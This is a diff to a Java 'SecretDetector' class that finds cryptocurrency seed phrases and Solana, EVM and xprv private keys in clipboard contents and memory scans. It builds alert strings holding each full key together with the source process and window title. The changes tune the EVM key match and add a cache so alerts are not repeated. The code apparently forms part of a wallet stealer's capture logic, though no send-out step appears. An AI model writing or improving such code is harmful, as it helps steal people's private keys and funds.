@@ -17,6 +17,8 @@ final class SecretDetector {
 	private static final Pattern XPRV = Pattern.compile("(?:xprv|yprv|zprv)[1-9A-HJ-NP-Za-km-z]{80,120}");
 	private static final Pattern EVM_KEY = Pattern.compile("(?:0x)?[0-9a-fA-F]{64}");
 	private static final Pattern SOLANA_KEY = Pattern.compile("[1-9A-HJ-NP-Za-km-z]{85,90}");
+	private static final long ALERT_TTL = 120_000L;
+	private static final Map<String, Long> recentAlerts = new java.util.concurrent.ConcurrentHashMap<>();
 	private static volatile Map<String, Integer> words;
 
 	private SecretDetector() {
@@ -41,7 +43,8 @@ final class SecretDetector {
 		if (XPRV.matcher(value).matches()) {
 			return new Secret("xprv", value);
 		}
-		if (EVM_KEY.matcher(value).matches()) {
+		if (EVM_KEY.matcher(value).matches()
+			&& (value.startsWith("0x") || distinctHex(value) >= 8)) {
 			return new Secret("evm-key", value);
 		}
 		if (SOLANA_KEY.matcher(value).matches()) {
@@ -59,6 +62,22 @@ final class SecretDetector {
 		return null;
 	}
 
+	/** Remembers clipboard alerts so a memory scan does not repeat them. */
+	static void alerted(String value) {
+		long now = System.currentTimeMillis();
+		recentAlerts.values().removeIf(stamp -> now - stamp >= ALERT_TTL);
+		recentAlerts.put(normalize(value), now);
+	}
+
+	static boolean alertedRecently(String value) {
+		Long stamp = recentAlerts.get(normalize(value));
+		return stamp != null && System.currentTimeMillis() - stamp < ALERT_TTL;
+	}
+
+	private static String normalize(String value) {
+		return value == null ? "" : value.strip().replaceAll("\\s+", " ").toLowerCase(Locale.ROOT);
+	}
+
 	static String message(Secret secret, String process, String title) {
 		return switch (secret.kind()) {
 			case "seed-12", "seed-24" -> "clipboard seed (" + secret.kind().substring(5) + " palabras): "
@@ -68,6 +87,20 @@ final class SecretDetector {
 			case "solana-key" -> "clipboard clave privada Solana: " + secret.value();
 			default -> "clipboard?: " + process + " | " + title + " | " + secret.value();
 		};
+	}
+
+	private static int distinctHex(String value) {
+		boolean[] seen = new boolean[16];
+		int distinct = 0;
+		for (int i = 0; i < value.length(); i++) {
+			char digit = Character.toLowerCase(value.charAt(i));
+			int index = digit <= '9' ? digit - '0' : digit - 'a' + 10;
+			if (index >= 0 && index < 16 && !seen[index]) {
+				seen[index] = true;
+				distinct++;
+			}
+		}
+		return distinct;
 	}
 
 	private static int bip39Count(String value) {
